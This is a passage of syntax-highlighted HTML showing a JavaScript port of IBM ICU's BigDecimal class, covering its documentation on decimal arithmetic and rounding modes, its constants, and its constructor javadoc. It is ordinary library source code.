class="line"><span class="comment"> * calculate using as many digits as you need -- thousands, if necessary.</span></span><br><span class="line"><span class="comment"> * Fixed point (scaled) arithmetic is indicated by using a</span></span><br><span class="line"><span class="comment"> * &lt;code&gt;digits&lt;/code&gt; setting of 0 (or omitting the</span></span><br><span class="line"><span class="comment"> * &lt;code&gt;MathContext&lt;/code&gt; parameter).</span></span><br><span class="line"><span class="comment"> * &lt;br&gt;</span></span><br><span class="line"><span class="comment"> * Similarly, you can change the algorithm used for rounding from the</span></span><br><span class="line"><span class="comment"> * default "classic" algorithm.</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;</span></span><br><span class="line"><span class="comment"> * In standard arithmetic (that is, when the &lt;code&gt;form&lt;/code&gt; setting</span></span><br><span class="line"><span class="comment"> * is not &lt;code&gt;PLAIN&lt;/code&gt;), a zero result is always expressed as the</span></span><br><span class="line"><span class="comment"> * single digit &lt;code&gt;'0'&lt;/code&gt; (that is, with no sign, decimal point,</span></span><br><span class="line"><span class="comment"> * or exponent part).</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;</span></span><br><span class="line"><span class="comment"> * Except for the division and power operators in standard arithmetic,</span></span><br><span class="line"><span class="comment"> * trailing zeros are preserved (this is in contrast to binary floating</span></span><br><span class="line"><span class="comment"> * point operations and most electronic calculators, which lose the</span></span><br><span class="line"><span class="comment"> * information about trailing zeros in the fractional part of results).</span></span><br><span class="line"><span class="comment"> * &lt;br&gt;</span></span><br><span class="line"><span class="comment"> * So, for example:</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;code&gt;</span></span><br><span class="line"><span class="comment"> *     new BigDecimal("2.40").add(     new BigDecimal("2"))      =&gt; "4.40"</span></span><br><span class="line"><span class="comment"> * &lt;br&gt;new BigDecimal("2.40").subtract(new BigDecimal("2"))      =&gt; "0.40"</span></span><br><span class="line"><span class="comment"> * &lt;br&gt;new BigDecimal("2.40").multiply(new BigDecimal("2"))      =&gt; "4.80"</span></span><br><span class="line"><span class="comment"> * &lt;br&gt;new BigDecimal("2.40").divide(  new BigDecimal("2"), def) =&gt; "1.2"</span></span><br><span class="line"><span class="comment"> * &lt;/code&gt;</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;where the value on the right of the &lt;code&gt;=&gt;&lt;/code&gt; would be the</span></span><br><span class="line"><span class="comment"> * result of the operation, expressed as a &lt;code&gt;String&lt;/code&gt;, and</span></span><br><span class="line"><span class="comment"> * &lt;code&gt;def&lt;/code&gt; (in this and following examples) refers to</span></span><br><span class="line"><span class="comment"> * &lt;code&gt;MathContext.DEFAULT&lt;/code&gt;).</span></span><br><span class="line"><span class="comment"> * This preservation of trailing zeros is desirable for most</span></span><br><span class="line"><span class="comment"> * calculations (including financial calculations).</span></span><br><span class="line"><span class="comment"> * If necessary, trailing zeros may be easily removed using division by 1.</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;</span></span><br><span class="line"><span class="comment"> * In standard arithmetic, exponential form is used for a result</span></span><br><span class="line"><span class="comment"> * depending on its value and the current setting of &lt;code&gt;digits&lt;/code&gt;</span></span><br><span class="line"><span class="comment"> * (the default is 9 digits).</span></span><br><span class="line"><span class="comment"> * If the number of places needed before the decimal point exceeds the</span></span><br><span class="line"><span class="comment"> * &lt;code&gt;digits&lt;/code&gt; setting, or the absolute value of the number is</span></span><br><span class="line"><span class="comment"> * less than &lt;code&gt;0.000001&lt;/code&gt;, then the number will be expressed in</span></span><br><span class="line"><span class="comment"> * exponential notation; thus</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;code&gt;</span></span><br><span class="line"><span class="comment"> *   new BigDecimal("1e+6").multiply(new BigDecimal("1e+6"), def)</span></span><br><span class="line"><span class="comment"> * &lt;/code&gt;</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;results in &lt;code&gt;1E+12&lt;/code&gt; instead of</span></span><br><span class="line"><span class="comment"> * &lt;code&gt;1000000000000&lt;/code&gt;, and</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;code&gt;</span></span><br><span class="line"><span class="comment"> *   new BigDecimal("1").divide(new BigDecimal("3E+10"), def)</span></span><br><span class="line"><span class="comment"> * &lt;/code&gt;</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;results in &lt;code&gt;3.33333333E-11&lt;/code&gt; instead of</span></span><br><span class="line"><span class="comment"> * &lt;code&gt;0.0000000000333333333&lt;/code&gt;.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * The form of the exponential notation (scientific or engineering) is</span></span><br><span class="line"><span class="comment"> * determined by the &lt;code&gt;form&lt;/code&gt; setting.</span></span><br><span class="line"><span class="comment"> * &lt;eul&gt;</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * The names of methods in this class follow the conventions established</span></span><br><span class="line"><span class="comment"> * by &lt;code&gt;java.lang.Number&lt;/code&gt;, &lt;code&gt;java.math.BigInteger&lt;/code&gt;,</span></span><br><span class="line"><span class="comment"> * and &lt;code&gt;java.math.BigDecimal&lt;/code&gt; in Java 1.1 and Java 1.2.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @see     MathContext</span></span><br><span class="line"><span class="comment"> * @author  Mike Cowlishaw</span></span><br><span class="line"><span class="comment"> * @stable ICU 2.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//--public class BigDecimal extends java.lang.Number implements java.io.Serializable,java.lang.Comparable&#123;</span></span><br><span class="line"><span class="comment">//-- private static final java.lang.String $0="BigDecimal.nrx";</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//-- methods</span></span><br><span class="line"> BigDecimal.prototype.abs = abs;</span><br><span class="line"> BigDecimal.prototype.add = add;</span><br><span class="line"> BigDecimal.prototype.compareTo = compareTo;</span><br><span class="line"> BigDecimal.prototype.divide = divide;</span><br><span class="line"> BigDecimal.prototype.divideInteger = divideInteger;</span><br><span class="line"> BigDecimal.prototype.max = max;</span><br><span class="line"> BigDecimal.prototype.min = min;</span><br><span class="line"> BigDecimal.prototype.multiply = multiply;</span><br><span class="line"> BigDecimal.prototype.negate = negate;</span><br><span class="line"> BigDecimal.prototype.plus = plus;</span><br><span class="line"> BigDecimal.prototype.pow = pow;</span><br><span class="line"> BigDecimal.prototype.remainder = remainder;</span><br><span class="line"> BigDecimal.prototype.subtract = subtract;</span><br><span class="line"> BigDecimal.prototype.equals = equals;</span><br><span class="line"> BigDecimal.prototype.format = format;</span><br><span class="line"> BigDecimal.prototype.intValueExact = intValueExact;</span><br><span class="line"> BigDecimal.prototype.movePointLeft = movePointLeft;</span><br><span class="line"> BigDecimal.prototype.movePointRight = movePointRight;</span><br><span class="line"> BigDecimal.prototype.scale = scale;</span><br><span class="line"> BigDecimal.prototype.setScale = setScale;</span><br><span class="line"> BigDecimal.prototype.signum = signum;</span><br><span class="line"> BigDecimal.prototype.toString = toString;</span><br><span class="line"> BigDecimal.prototype.layout = layout;</span><br><span class="line"> BigDecimal.prototype.intcheck = intcheck;</span><br><span class="line"> BigDecimal.prototype.dodivide = dodivide;</span><br><span class="line"> BigDecimal.prototype.bad = bad;</span><br><span class="line"> BigDecimal.prototype.badarg = badarg;</span><br><span class="line"> BigDecimal.prototype.extend = extend;</span><br><span class="line"> BigDecimal.prototype.byteaddsub = byteaddsub;</span><br><span class="line"> BigDecimal.prototype.diginit = diginit;</span><br><span class="line"> BigDecimal.prototype.clone = clone;</span><br><span class="line"> BigDecimal.prototype.checkdigits = checkdigits;</span><br><span class="line"> BigDecimal.prototype.round = round;</span><br><span class="line"> BigDecimal.prototype.allzero = allzero;</span><br><span class="line"> BigDecimal.prototype.finish = finish;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// Convenience methods</span></span><br><span class="line"> BigDecimal.prototype.isGreaterThan = isGreaterThan;</span><br><span class="line"> BigDecimal.prototype.isLessThan = isLessThan;</span><br><span class="line"> BigDecimal.prototype.isGreaterThanOrEqualTo = isGreaterThanOrEqualTo;</span><br><span class="line"> BigDecimal.prototype.isLessThanOrEqualTo = isLessThanOrEqualTo;</span><br><span class="line"> BigDecimal.prototype.isPositive = isPositive;</span><br><span class="line"> BigDecimal.prototype.isNegative = isNegative;</span><br><span class="line"> BigDecimal.prototype.isZero = isZero;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* ----- Constants ----- */</span></span><br><span class="line"> <span class="comment">/* properties constant public */</span> <span class="comment">// useful to others</span></span><br><span class="line"> <span class="comment">// the rounding modes (copied here for upwards compatibility)</span></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Rounding mode to round to a more positive number.</span></span><br><span class="line"><span class="comment">  * @see MathContext#ROUND_CEILING</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="comment">//--public static final int ROUND_CEILING=com.ibm.icu.math.MathContext.ROUND_CEILING;</span></span><br><span class="line"> BigDecimal.ROUND_CEILING = BigDecimal.prototype.ROUND_CEILING = MathContext.prototype.ROUND_CEILING;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Rounding mode to round towards zero.</span></span><br><span class="line"><span class="comment">  * @see MathContext#ROUND_DOWN</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="comment">//--public static final int ROUND_DOWN=com.ibm.icu.math.MathContext.ROUND_DOWN;</span></span><br><span class="line"> BigDecimal.ROUND_DOWN = BigDecimal.prototype.ROUND_DOWN = MathContext.prototype.ROUND_DOWN;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Rounding mode to round to a more negative number.</span></span><br><span class="line"><span class="comment">  * @see MathContext#ROUND_FLOOR</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="comment">//--public static final int ROUND_FLOOR=com.ibm.icu.math.MathContext.ROUND_FLOOR;</span></span><br><span class="line"> BigDecimal.ROUND_FLOOR = BigDecimal.prototype.ROUND_FLOOR = MathContext.prototype.ROUND_FLOOR;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Rounding mode to round to nearest neighbor, where an equidistant</span></span><br><span class="line"><span class="comment">  * value is rounded down.</span></span><br><span class="line"><span class="comment">  * @see MathContext#ROUND_HALF_DOWN</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="comment">//--public static final int ROUND_HALF_DOWN=com.ibm.icu.math.MathContext.ROUND_HALF_DOWN;</span></span><br><span class="line"> BigDecimal.ROUND_HALF_DOWN = BigDecimal.prototype.ROUND_HALF_DOWN = MathContext.prototype.ROUND_HALF_DOWN;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Rounding mode to round to nearest neighbor, where an equidistant</span></span><br><span class="line"><span class="comment">  * value is rounded to the nearest even neighbor.</span></span><br><span class="line"><span class="comment">  * @see MathContext#ROUND_HALF_EVEN</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="comment">//--public static final int ROUND_HALF_EVEN=com.ibm.icu.math.MathContext.ROUND_HALF_EVEN;</span></span><br><span class="line"> BigDecimal.ROUND_HALF_EVEN = BigDecimal.prototype.ROUND_HALF_EVEN = MathContext.prototype.ROUND_HALF_EVEN;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Rounding mode to round to nearest neighbor, where an equidistant</span></span><br><span class="line"><span class="comment">  * value is rounded up.</span></span><br><span class="line"><span class="comment">  * @see MathContext#ROUND_HALF_UP</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="comment">//--public static final int ROUND_HALF_UP=com.ibm.icu.math.MathContext.ROUND_HALF_UP;</span></span><br><span class="line"> BigDecimal.ROUND_HALF_UP = BigDecimal.prototype.ROUND_HALF_UP = MathContext.prototype.ROUND_HALF_UP;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Rounding mode to assert that no rounding is necessary.</span></span><br><span class="line"><span class="comment">  * @see MathContext#ROUND_UNNECESSARY</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="comment">//--public static final int ROUND_UNNECESSARY=com.ibm.icu.math.MathContext.ROUND_UNNECESSARY;</span></span><br><span class="line"> BigDecimal.ROUND_UNNECESSARY = BigDecimal.prototype.ROUND_UNNECESSARY = MathContext.prototype.ROUND_UNNECESSARY;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Rounding mode to round away from zero.</span></span><br><span class="line"><span class="comment">  * @see MathContext#ROUND_UP</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="comment">//--public static final int ROUND_UP=com.ibm.icu.math.MathContext.ROUND_UP;</span></span><br><span class="line"> BigDecimal.ROUND_UP = BigDecimal.prototype.ROUND_UP = MathContext.prototype.ROUND_UP;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* properties constant private */</span> <span class="comment">// locals</span></span><br><span class="line"> <span class="comment">//--private static final byte ispos=1; // ind: indicates positive (must be 1)</span></span><br><span class="line"> <span class="comment">//--private static final byte iszero=0; // ind: indicates zero     (must be 0)</span></span><br><span class="line"> <span class="comment">//--private static final byte isneg=-1; // ind: indicates negative (must be -1)</span></span><br><span class="line"> BigDecimal.prototype.ispos = <span class="number">1</span>;</span><br><span class="line"> BigDecimal.prototype.iszero = <span class="number">0</span>;</span><br><span class="line"> BigDecimal.prototype.isneg = <span class="number">-1</span>;</span><br><span class="line"> <span class="comment">// [later could add NaN, +/- infinity, here]</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--private static final int MinExp=-999999999; // minimum exponent allowed</span></span><br><span class="line"> <span class="comment">//--private static final int MaxExp=999999999; // maximum exponent allowed</span></span><br><span class="line"> <span class="comment">//--private static final int MinArg=-999999999; // minimum argument integer</span></span><br><span class="line"> <span class="comment">//--private static final int MaxArg=999999999; // maximum argument integer</span></span><br><span class="line"> BigDecimal.prototype.MinExp=<span class="number">-999999999</span>; <span class="comment">// minimum exponent allowed</span></span><br><span class="line"> BigDecimal.prototype.MaxExp=<span class="number">999999999</span>; <span class="comment">// maximum exponent allowed</span></span><br><span class="line"> BigDecimal.prototype.MinArg=<span class="number">-999999999</span>; <span class="comment">// minimum argument integer</span></span><br><span class="line"> BigDecimal.prototype.MaxArg=<span class="number">999999999</span>; <span class="comment">// maximum argument integer</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--private static final com.ibm.icu.math.MathContext plainMC=new com.ibm.icu.math.MathContext(0,com.ibm.icu.math.MathContext.PLAIN); // context for plain unlimited math</span></span><br><span class="line"> BigDecimal.prototype.plainMC=<span class="keyword">new</span> MathContext(<span class="number">0</span>, MathContext.prototype.PLAIN);</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* properties constant private unused */</span> <span class="comment">// present but not referenced</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">// Serialization version</span></span><br><span class="line"> <span class="comment">//--private static final long serialVersionUID=8245355804974198832L;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--private static final java.lang.String copyright=" Copyright (c) IBM Corporation 1996, 2000.  All rights reserved. ";</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* properties static private */</span></span><br><span class="line"> <span class="comment">// Precalculated constant arrays (used by byteaddsub)</span></span><br><span class="line"> <span class="comment">//--private static byte bytecar[]=new byte[(90+99)+1]; // carry/borrow array</span></span><br><span class="line"> <span class="comment">//--private static byte bytedig[]=diginit(); // next digit array</span></span><br><span class="line"> BigDecimal.prototype.bytecar = <span class="keyword">new</span> <span class="built_in">Array</span>((<span class="number">90</span>+<span class="number">99</span>)+<span class="number">1</span>);</span><br><span class="line"> BigDecimal.prototype.bytedig = diginit();</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * The &lt;code&gt;BigDecimal&lt;/code&gt; constant "0".</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @see #ONE</span></span><br><span class="line"><span class="comment">  * @see #TEN</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="comment">//--public static final com.ibm.icu.math.BigDecimal ZERO=new com.ibm.icu.math.BigDecimal((long)0); // use long as we want the int constructor</span></span><br><span class="line"> <span class="comment">// .. to be able to use this, for speed</span></span><br><span class="line">BigDecimal.ZERO = BigDecimal.prototype.ZERO = <span class="keyword">new</span> BigDecimal(<span class="string">"0"</span>);</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * The &lt;code&gt;BigDecimal&lt;/code&gt; constant "1".</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @see #TEN</span></span><br><span class="line"><span class="comment">  * @see #ZERO</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="comment">//--public static final com.ibm.icu.math.BigDecimal ONE=new com.ibm.icu.math.BigDecimal((long)1); // use long as we want the int constructor</span></span><br><span class="line"> <span class="comment">// .. to be able to use this, for speed</span></span><br><span class="line">BigDecimal.ONE = BigDecimal.prototype.ONE = <span class="keyword">new</span> BigDecimal(<span class="string">"1"</span>);</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * The &lt;code&gt;BigDecimal&lt;/code&gt; constant "10".</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @see #ONE</span></span><br><span class="line"><span class="comment">  * @see #ZERO</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="comment">//--public static final com.ibm.icu.math.BigDecimal TEN=new com.ibm.icu.math.BigDecimal(10);</span></span><br><span class="line"> BigDecimal.TEN = BigDecimal.prototype.TEN = <span class="keyword">new</span> BigDecimal(<span class="string">"10"</span>);</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* ----- Instance properties [all private and immutable] ----- */</span></span><br><span class="line"> <span class="comment">/* properties private */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * The indicator. This may take the values:</span></span><br><span class="line"><span class="comment">  * &lt;ul&gt;</span></span><br><span class="line"><span class="comment">  * &lt;li&gt;ispos  -- the number is positive</span></span><br><span class="line"><span class="comment">  * &lt;li&gt;iszero -- the number is zero</span></span><br><span class="line"><span class="comment">  * &lt;li&gt;isneg  -- the number is negative</span></span><br><span class="line"><span class="comment">  * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @serial</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="comment">//--private byte ind; // assumed undefined</span></span><br><span class="line"> <span class="comment">// Note: some code below assumes IND = Sign [-1, 0, 1], at present.</span></span><br><span class="line"> <span class="comment">// We only need two bits for this, but use a byte [also permits</span></span><br><span class="line"> <span class="comment">// smooth future extension].</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * The formatting style. This may take the values:</span></span><br><span class="line"><span class="comment">  * &lt;ul&gt;</span></span><br><span class="line"><span class="comment">  * &lt;li&gt;MathContext.PLAIN        -- no exponent needed</span></span><br><span class="line"><span class="comment">  * &lt;li&gt;MathContext.SCIENTIFIC   -- scientific notation required</span></span><br><span class="line"><span class="comment">  * &lt;li&gt;MathContext.ENGINEERING  -- engineering notation required</span></span><br><span class="line"><span class="comment">  * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * This property is an optimization; it allows us to defer number</span></span><br><span class="line"><span class="comment">  * layout until it is actually needed as a string, hence avoiding</span></span><br><span class="line"><span class="comment">  * unnecessary formatting.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @serial</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="comment">//--private byte form=(byte)com.ibm.icu.math.MathContext.PLAIN; // assumed PLAIN</span></span><br><span class="line"> <span class="comment">// We only need two bits for this, at present, but use a byte</span></span><br><span class="line"> <span class="comment">// [again, to allow for smooth future extension]</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * The value of the mantissa.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * Once constructed, this may become shared between several BigDecimal</span></span><br><span class="line"><span class="comment">  * objects, so must not be altered.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * For efficiency (speed), this is a byte array, with each byte</span></span><br><span class="line"><span class="comment">  * taking a value of 0 -&gt; 9.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * If the first byte is 0 then the value of the number is zero (and</span></span><br><span class="line"><span class="comment">  * mant.length=1, except when constructed from a plain number, for</span></span><br><span class="line"><span class="comment">  * example, 0.000).</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @serial</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="comment">//--private byte mant[]; // assumed null</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * The exponent.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * For fixed point arithmetic, scale is &lt;code&gt;-exp&lt;/code&gt;, and can</span></span><br><span class="line"><span class="comment">  * apply to zero.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * Note that this property can have a value less than MinExp when</span></span><br><span class="line"><span class="comment">  * the mantissa has more than one digit.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @serial</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="comment">//--private int exp;</span></span><br><span class="line"> <span class="comment">// assumed 0</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* ---------------------------------------------------------------- */</span></span><br><span class="line"> <span class="comment">/* Constructors                                                     */</span></span><br><span class="line"> <span class="comment">/* ---------------------------------------------------------------- */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Constructs a &lt;code&gt;BigDecimal&lt;/code&gt; object from a</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;java.math.BigDecimal&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * Constructs a &lt;code&gt;BigDecimal&lt;/code&gt; as though the parameter had</span></span><br><span class="line"><span class="comment">  * been represented as a &lt;code&gt;String&lt;/code&gt; (using its</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;toString&lt;/code&gt; method) and the</span></span><br><span class="line"><span class="comment">  * &#123;@link #BigDecimal(java.lang.String)&#125; constructor had then been</span></span><br><span class="line"><span class="comment">  * used.</span></span><br><span class="line"><span class="comment">  * The parameter must not be &lt;code&gt;null&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * &lt;i&gt;(Note: this constructor is provided only in the</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;com.ibm.icu.math&lt;/code&gt; version of the BigDecimal class.</span></span><br><span class="line"><span class="comment">  * It would not be present in a &lt;code&gt;java.math&lt;/code&gt; version.)&lt;/i&gt;</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param bd The &lt;code&gt;BigDecimal&lt;/code&gt; to be translated.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public BigDecimal(java.math.BigDecimal bd)&#123;</span></span><br><span class="line"> <span class="comment">//-- this(bd.toString());</span></span><br><span class="line"> <span class="comment">//-- return;&#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Constructs a &lt;code&gt;BigDecimal&lt;/code&gt; object from a</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;BigInteger&lt;/code&gt;, with scale 0.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * Constructs a &lt;code&gt;BigDecimal&lt;/code&gt; which is the exact decimal</span></span><br><span class="line"><span class="comment">  * representation of the &lt;code&gt;BigInteger&lt;/code&gt;, with a scale of</span></span><br><span class="line"><span class="comment">  * zero.</span></span><br><span class="line"><span class="comment">  * The value of the &lt;code&gt;BigDecimal&lt;/code&gt; is identical to the value</span></span><br><span class="line"><span class="comment">  * of the &lt;code&gt;BigInteger&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * The parameter must not be &lt;code&gt;null&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The &lt;code&gt;BigDecimal&lt;/code&gt; will contain only decimal digits,</span></span><br><span class="line"><span class="comment">  * prefixed with a leading minus sign (hyphen) if the</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;BigInteger&lt;/code&gt; is negative.  A leading zero will be</span></span><br><span class="line"><span class="comment">  * present only if the &lt;code&gt;BigInteger&lt;/code&gt; is zero.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param bi The &lt;code&gt;BigInteger&lt;/code&gt; to be converted.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public BigDecimal(java.math.BigInteger bi)&#123;</span></span><br><span class="line"> <span class="comment">//-- this(bi.toString(10));</span></span><br><span class="line"> <span class="comment">//-- return;&#125;</span></span><br><span class="line"> <span class="comment">// exp remains 0</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Constructs a &lt;code&gt;BigDecimal&lt;/code&gt; object from a</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;BigInteger&lt;/code&gt; and a scale.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * Constructs a &lt;code&gt;BigDecimal&lt;/code&gt; which is the exact decimal</span></span><br><span class="line"><span class="comment">  * representation of the &lt;code&gt;BigInteger&lt;/code&gt;, scaled by the</span></span><br><span class="line"><span class="comment">  * second parameter, which may not be negative.</span></span><br><span class="line"><span class="comment">  * The value of the &lt;code&gt;BigDecimal&lt;/code&gt; is the</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;BigInteger&lt;/code&gt; divided by ten to the power of the scale.</span></span><br><span class="line"><span class="comment">  * The &lt;code&gt;BigInteger&lt;/code&gt; parameter must not be</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;null&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The &lt;code&gt;BigDecimal&lt;/code&gt; will contain only decimal digits, (with</span></span><br><span class="line"><span class="comment">  * an embedded decimal point followed by &lt;code&gt;scale&lt;/code&gt; decimal</span></span><br><span class="line"><span class="comment">  * digits if the scale is positive), prefixed with a leading minus</span></span><br><span class="line"><span class="comment">  * sign (hyphen) if the &lt;code&gt;BigInteger&lt;/code&gt; is negative.  A</span></span><br><span class="line"><span class="comment">  * leading zero will be present only if the &lt;code&gt;BigInteger&lt;/code&gt; is</span></span><br><span class="line"><span class="comment">  * zero.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param  bi    The &lt;code&gt;BigInteger&lt;/code&gt; to be converted.</span></span><br><span class="line"><span class="comment">  * @param  scale The &lt;code&gt;int&lt;/code&gt; specifying the scale.</span></span><br><span class="line"><span class="comment">  * @throws NumberFormatException if the scale is negative.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public BigDecimal(java.math.BigInteger bi,int scale)&#123;</span></span><br><span class="line"> <span class="comment">//-- this(bi.toString(10));</span></span><br><span class="line"> <span class="comment">//-- if (scale&lt;0)</span></span><br><span class="line"> <span class="comment">//--  throw new java.lang.NumberFormatException("Negative scale:"+" "+scale);</span></span><br><span class="line"> <span class="comment">//-- exp=(int)-scale; // exponent is -scale</span></span><br><span class="line"> <span class="comment">//-- return;&#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Constructs a &lt;code&gt;BigDecimal&lt;/code&gt; object from an array of characters.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * Constructs a &lt;code&gt;BigDecimal&lt;/code&gt; as though a</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;String&lt;/code&gt; had been constructed from the character array</span></span><br><span 